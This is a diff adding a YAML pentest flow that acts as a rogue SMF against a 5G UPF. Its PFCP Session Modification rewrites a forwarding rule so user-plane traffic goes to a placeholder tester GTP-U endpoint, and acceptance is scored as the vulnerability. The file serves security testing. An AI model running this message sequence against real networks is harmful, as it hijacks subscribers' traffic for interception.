@@ -1,0 +1,139 @@
+# NEGATIVE / pentest — PFCP Session Modification that redirects a FAR to a
+# tester GTP-U endpoint (rogue SMF on N4).
+#
+# 3GPP TS 29.244 §7.5.4 / §8.2.26 / §8.2.56; TS 33.501 §5.9.3 (N4 has no
+# node-level authentication — any peer that can send PFCP can rewrite FARs).
+#
+# WHAT IS ON THE WIRE
+# -------------------
+# Association + Session Establishment (uplink PDR/FAR, same body as
+# upf_pfcp_session_modify), then PFCPSessionModificationRequest that sets
+# FAR 1 Apply Action FORW (flags=2) and Update Forwarding Parameters with
+# Outer Header Creation GTP-U/UDP/IPv4 (description=256 / 0x0100,
+# TS 29.244 §8.2.56) pointing at a tester GTP-U endpoint.
+#
+# PLACEHOLDER — operator replaces with the tester N3/N6 GTP-U address.
+#   IPv4 203.0.113.10 (TEST-NET-3)  TEID 0x0000c0de (non-zero)
+# JSON []byte fields are base64 (the proto IEs are []byte, not dotted-quad):
+#   ipv4_address: ywBxCg==   teid: AADA3g==
+#
+# EXPECTED TERMINAL
+# -----------------
+#   accepted — Cause "Request accepted". That IS the finding: a stranger SMF
+#              can redirect user-plane forwarding.
+#   rejected — the UPF refused (or silently dropped) the redirect. Secure
+#              outcome. Timeout maps here (silent drop).
+#   failed   — no usable PFCP answer / crash. A reject Cause other than
+#              "Request accepted" fails the Cause check and also lands here;
+#              read the trace — that is still "hijack refused".
+#
+# category: negative.
+
+kind: flow
+name: upf_pfcp_session_modify_redirect_far
+description: Rogue SMF Session Modification redirecting a FAR to a tester GTP-U endpoint
+category: negative
+type: client
+protocol: pfcp
+nf: upf
+
+initial_state: idle
+final_states:
+  - accepted
+  - rejected
+  - failed
+
+states:
+  idle:
+    transitions:
+      - event: Start
+        target: wait_assoc
+        actions:
+          - type: send
+            message: PFCPAssociationSetupRequest
+            peer: upf
+
+  wait_assoc:
+    on_timeout:
+      duration: 5s
+      target: failed
+    transitions:
+      - event: pfcp.PFCPAssociationSetupResponse
+        target: wait_session
+        actions:
+          - type: check
+            field: pfcp.cause
+            op: equals
+            expected: "Request accepted"
+          - type: send
+            message: PFCPSessionEstablishmentRequest
+            message_body: |
+              {
+                "create_pdr": [
+                  {
+                    "pdr_id": {"value": 1},
+                    "precedence": {"value": 255},
+                    "pdi": {
+                      "source_interface": 1,
+                      "local_f_teid": {"ch": true}
+                    },
+                    "outer_header_removal": {"description": 0},
+                    "far_id": {"value": 1}
+                  }
+                ],
+                "create_far": [
+                  {
+                    "far_id": {"value": 1},
+                    "apply_action": {"flags": 2},
+                    "forwarding_parameters": {
+                      "destination_interface": 2
+                    }
+                  }
+                ]
+              }
+
+  wait_session:
+    on_timeout:
+      duration: 5s
+      target: failed
+    transitions:
+      - event: pfcp.PFCPSessionEstablishmentResponse
+        target: wait_modify
+        actions:
+          - type: check
+            field: pfcp.cause
+            op: equals
+            expected: "Request accepted"
+          # Redirect FAR 1 to tester GTP-U. PLACEHOLDER: 203.0.113.10 / TEID 0x0000c0de.
+          - type: send
+            message: PFCPSessionModificationRequest
+            message_body: |
+              {
+                "update_far": [
+                  {
+                    "far_id": {"value": 1},
+                    "apply_action": {"flags": 2},
+                    "update_forwarding_parameters": {
+                      "destination_interface": 1,
+                      "outer_header_creation": {
+                        "description": 256,
+                        "teid": "AADA3g==",
+                        "ipv4_address": "ywBxCg=="
+                      }
+                    }
+                  }
+                ]
+              }
+
+  wait_modify:
+    on_timeout:
+      duration: 5s
+      target: rejected
+    transitions:
+      - event: pfcp.PFCPSessionModificationResponse
+        target: accepted
+        actions:
+          - type: check
+            field: pfcp.cause
+            op: equals
+            expected: "Request accepted"
